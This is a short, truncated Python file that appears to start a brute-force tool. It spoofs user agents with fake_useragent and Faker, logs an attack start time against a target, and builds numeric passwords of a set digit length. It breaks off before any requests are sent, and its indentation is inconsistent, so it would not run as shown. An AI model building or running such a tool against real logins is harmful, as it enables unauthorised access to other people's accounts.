import requests,os
from fake_useragent import UserAgent
from datetime import datetime, timedelta, timezone
from faker import Faker
ua = UserAgent()
faker = Faker()

def attack(target,logfilename,start,digit,addname = False,ename = None):
    if digit <= 0:
    	os._exit(1)
    #logger start
    dt1 = datetime.utcnow().replace(tzinfo=timezone.utc)
    dt2 = dt1.astimezone(timezone(timedelta(hours=8))) # 轉換時區 -> 東八區
    twt=dt2.strftime("%Y-%m-%d %H:%M:%S")
	file = open(logfilename,'w')
    file.write('[attack'+target+'start at '+twt+'] \n')
	file.close()
	#logger end
	#define passwd start
	if start == True:
		passwd = 0
	else:
		passwd = 9
		if len(str(passwd)) < digit:
		    for i in range(digit-1):	
		      passwd = int(str(passwd) + '9')
		
		 